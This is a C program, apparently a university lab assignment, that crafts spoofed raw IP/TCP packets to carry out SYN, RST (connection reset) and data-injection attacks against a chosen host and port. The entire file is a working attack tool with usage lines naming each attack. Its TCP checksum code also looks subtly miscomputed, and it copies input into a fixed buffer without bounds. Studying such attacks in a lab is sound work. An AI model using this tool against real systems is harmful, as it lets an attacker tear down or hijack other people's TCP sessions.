#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <stdint.h>

//
// ========= PROFESSOR’S REQUIRED CHECKSUM FUNCTIONS =========
//

// IP checksum (header only)
unsigned short csum_ip(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;

    while (sum >> 16)
        sum = (sum >> 16) + (sum & 0xFFFF);

    return ~sum;
}

// TCP checksum using IP pseudo-header
unsigned short csum_tcp(unsigned short *buf, int nwords) {
    unsigned long sum = 0;

    // Pseudo-header: src/dst IP (4 words = 8 bytes)
    sum += buf[6];
    sum += buf[7];
    sum += buf[8];
    sum += buf[9];

    sum += htons(6);   // Protocol = TCP
    sum += htons(20 + (nwords << 1));  // TCP header (20B) + payload

    // TCP header starts at word 10 (offset = 20 bytes)
    for (int i = 10; i < 20 + nwords; ++i)
        sum += buf[i];

    while (sum >> 16)
        sum = (sum >> 16) + (sum & 0xFFFF);

    return ~sum;
}

//
// ========= MAIN PROGRAM =========
//

int main(int argc, char *argv[]) {

    if (argc < 8) {
        fprintf(stderr,
            "Usage:\n"
            "  SYN  attack: sudo ./attack S <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
            "  RST  attack: sudo ./attack R <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
            "  DATA attack: sudo ./attack D <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> <payload>\n");
        return 1;
    }

    char mode      = argv[1][0];
    char *src_ip   = argv[2];
    int src_port   = atoi(argv[3]);
    char *dst_ip   = argv[4];
    int dst_port   = atoi(argv[5]);
    uint32_t seq   = (uint32_t)strtoul(argv[6], NULL, 10);
    uint32_t ack   = (uint32_t)strtoul(argv[7], NULL, 10);

    char packet[4096];
    memset(packet, 0, sizeof(packet));

    struct iphdr  *iph  = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    char *payload       = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);

    int payload_len = 0;
    if (mode == 'D') {
        if (argc < 9) {
            fprintf(stderr, "DATA attack requires payload.\n");
            return 1;
        }
        strcpy(payload, argv[8]);
        payload_len = strlen(argv[8]);
    }

    //
    // ========= BUILD IP HEADER =========
    //
    iph->ihl      = 5;     // 20 bytes
    iph->version  = 4;
    iph->tos      = 0;
    iph->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    iph->id       = htons(54321);
    iph->frag_off = 0;
    iph->ttl      = 64;
    iph->protocol = 6;     // TCP
    iph->saddr    = inet_addr(src_ip);
    iph->daddr    = inet_addr(dst_ip);
    iph->check    = 0;

    //
    // ========= BUILD TCP HEADER =========
    //
    tcph->source  = htons(src_port);
    tcph->dest    = htons(dst_port);
    tcph->seq     = htonl(seq);
    tcph->ack_seq = htonl(ack);
    tcph->doff    = 5;     // 20 bytes
    tcph->window  = htons(65535);
    tcph->urg_ptr = 0;

    tcph->syn = tcph->ack = tcph->psh = tcph->rst = tcph->fin = tcph->urg = 0;

    // ---------------- Flags ----------------
    if (mode == 'S') {
        tcph->syn = 1;
    }
    else if (mode == 'R') {
        tcph->rst = 1;
        tcph->ack = 1;    // IMPORTANT: RST must have ACK set
    }
    else if (mode == 'D') {
        tcph->psh = 1;
        tcph->ack = 1;
    }
    else {
        fprintf(stderr, "Unknown type %c\n", mode);
        return 1;
    }

    //
    // ========= CHECKSUMS =========
    //
    unsigned short *w = (unsigned short *)packet;

    iph->check = csum_ip(w, 10);

    int nwords = (payload_len + 1) / 2;
    tcph->check = 0;
    tcph->check = csum_tcp(w, nwords);

    //
    // ========= RAW SOCKET SEND =========
    //
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        perror("socket");
        return 1;
    }

    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family      = AF_INET;
    sin.sin_port        = tcph->dest;
    sin.sin_addr.s_addr = iph->daddr;

    int pkt_len = ntohs(iph->tot_len);

    if (sendto(s, packet, pkt_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("sendto");
        close(s);
        return 1;
    }

    printf("Sent %c: %s:%d → %s:%d  SEQ=%u  ACK=%u  payload_len=%d\n",
           mode, src_ip, src_port, dst_ip, dst_port, seq, ack, payload_len);

    close(s);
    return 0;
}
